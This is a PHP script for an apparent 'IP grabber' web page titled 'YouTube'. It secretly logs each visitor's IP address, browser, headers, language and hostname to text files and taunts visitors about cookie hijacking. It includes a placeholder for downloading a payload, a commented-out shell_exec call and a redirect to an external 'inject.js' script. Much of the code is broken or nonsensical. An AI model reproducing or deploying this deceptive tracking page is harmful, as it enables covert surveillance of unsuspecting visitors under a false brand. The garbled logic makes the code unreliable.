<?php

$IP = $_SERVER['REMOTE_ADDR'];
$proto = $_SERVER['SERVER_PROTOCOL']; 
$BROWSER = $_SERVER['HTTP_USER_AGENT'];

$Time = $_SERVER['REQUEST_TIME'];
$SOFTWARE = $_SERVER['SERVER_SOFTWARE'];
$HTTACCEPT = $_SERVER['HTTP_ACCEPT'];
$REQMETH = $_SERVER['REQUEST_METHOD'];
$fh = fopen('log.txt', 'a');
header("Location:  http://localhost/grabber.php");
header('HTTP/1.0 404 Not Found');
if(empty($fh)){
fclose($fh);
}
for ($i = 0; $i <= $fh;$i++){
    fwrite($fh , $IP);
    fwrite($fh, "\n$proto");   
    fwrite($fh, "\t$REQMETH");
}
fclose($fh);
echo "<script>console.log( '$IP Is your IP address and your protocol: $proto');</script>";
function dectorate(){
  echo "<style>body{background-color:#24CC54; } .host-information{ background-color:#DD646E; } p{font-family: sans-serif; color: lightblue;} pre{color: green;}</style>";
  echo "<script></script>";
}



echo "<html> <head><title>YouTube</title><meta charset='utf-8'></head>";
echo "<body background= background.jpg><script>console.log('Your IP has been logged. Enjoy it'); console.log('$BROWSER is your Browser');</script>";
dectorate();



function Browser(){
    $BROWSER = $_SERVER['HTTP_USER_AGENT'];
    $fh = fopen("information.txt" ,"a");
    fwrite($fh, "\nBrowser information:\n ");
    fwrite($fh , $BROWSER);
    fclose($fh);
    echo "<script>g = document.location.url;document.location;gh = document.location.href;document.cookie = 'change_this_section_to_operate';console.log('Your cookie has been hijacked');</script>";
echo "<style>h1{color: red;} body{font-family: Arial, 'Roberto'; font-size: 30px;};";

}




function Rev_DNS(){
    try{
    $IP = $_SERVER['REMOTE_ADDR'];
    
    $REV_HST = gethostbyaddr($IP);
    echo "<div class='host-information'><h3>Your hostname is $REV_HST\n</h3></div>";
	echo "<pre style='color=black;font-family:sans-serif;'>As well your browser and operating system have been logged within the server and in your console</pre>";
    $fh = fopen("information.txt" , "a");
    fwrite($fh, "\nRemote Computer information:\t\r\n ");
    fwrite($fh ,"\n$REV_HST\n");


    //Protocols like POST/GET
    $PROTO = $_SERVER['REQUEST_METHOD'];
    fwrite($fh , "\nServer Protocol's operated\n");
    fwrite($fh, "\nThe Protocol used: $PROTO");
    fclose($fh);
    }
    catch(Exception $e){
echo "<pre style=font-color:red;>An error has occured:$e, however protocol's are saved</pre>";
return 1;
// do the protocol bit again
$PROTO = $_SERVER['REQUEST_METHOD'];
    fwrite($fh , "\nServer Protocol's operated\n");
    fwrite($fh, "\nThe Protocol used: $PROTO");
    fclose($fh);
    }
}



Rev_DNS();
Browser();



function Get_Header(){
    try{
    $HTTACCEPT = $_SERVER['HTTP_ACCEPT'];
    $KCP = $_SERVER['HTTP_CONNECTION'];
    $language_used = $_SERVER['HTTP_ACCEPT_LANGUAGE'];
$fh = fopen("information.txt" ,"a");
fwrite($fh, "\nHeader:\n");
fwrite($fh , $HTTACCEPT);
fwrite($fh , $KCP);
fclose($fh);
$fe = fopen("additional_information.txt" ,"a");
fwrite($fe, "\nThe additional information given is listed below\n");
fwrite($fe, "\nBelow Is the langauge that was used within the client browser\n\r");
fwrite($fe , $language_used);
fclose($fe);
    }
    catch(Exception $e){
        echo "$e has occurred.";
        return 1;
    }
};



Get_Header();

    function Serv_Port(){
        $SERVER_PORT = $_SERVER['SERVER_PORT'];
        $SERVER_ACCPT_CONN = $_SERVER['REQUEST_METHOD'];
        
        
       
echo "<script> console.error('$SERVER_ACCPT_CONN');</script>";
        }
        
    


   
/*
function get_access(){
	$SERVIP = $_SERVER['SERVER_ADDR'];
    echo "<script>console.log('The servers IP is $SERVIP and a remote conn has been made');</script>";

    $script_run = shell_exec('start explorer.exe');
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        //system($commands." > NUL");
        
    }
    if(strtoupper(substr(PHP_OS, 0 , 2)) == 'IOS')

}//fix above statements

}*/
//get_access();
function gather_emails(){
    $IP = $_SERVER['REMOTE_ADDR'];
    $get_provider_DNS  = checkdnsrr($IP);
    echo "<script>console.log($get_provider_DNS);</script>";
}
gather_emails();
function gather_long(){
    $IP = $_SERVER['REMOTE_ADDR'];
  $longtitude =  ip2long($IP);
  echo "<script>console.log('$longtitude is where you currently are located');   </script>";
}
gather_long();
function spoof_serv_status(){
    $getservstatus = http_response_code(404);
    echo "<script>console.log($getservstatus);</script>";
    $hide_serv = file('server_status' , 'w'); //writes to file server status
    fwrite($hide_serv, "$getservstatus");
    fclose($hide_serv);
   
}

function _Download_Attack_Vector(){

    $URI = $_SERVER['http://IP/MALV']; // Change to payload later on
    $C_MODIFIER = $_COOKIE[''];

    // Work on this later at free time
}
spoof_serv_status(); //test out func
gather_emails();
function redird($uri){
    $IP = $_SERVER['REMOTE_ADDR'];
    try{
        $HTTACCEPT = $_SERVER['HTTP_ACCEPT'];
        $img_grabber = @imagecreatefromjpeg("https://resources.altium.com/sites/default/files/blogs/Semiconductor%20Fiber%20Could%20Replace%20Fiber%20Optic%20Cable%20Transmission%20Lines-37745.jpg");
        echo "<iframe><script>d = document.location;cj=document.location.href;</script></iframe>";
        
    }
    catch (Exception $e){
        $fp = fopen('iplog.txt', 'a');
fwrite($fp, "$IP" ,'\n');  
fwrite($fp, $e + "Had occurred");
fclose($fp);
$val = "<script>document.location.url = 'http://www.cs-go.me/inject.js'; </script>";//Grabs IP through IFrame Injection
echo "<h1> Your Ipv4 address has been logged no matter how hard you really tried.</h1>";
    }
}
redird("http://localhost/test.php"); 

?>
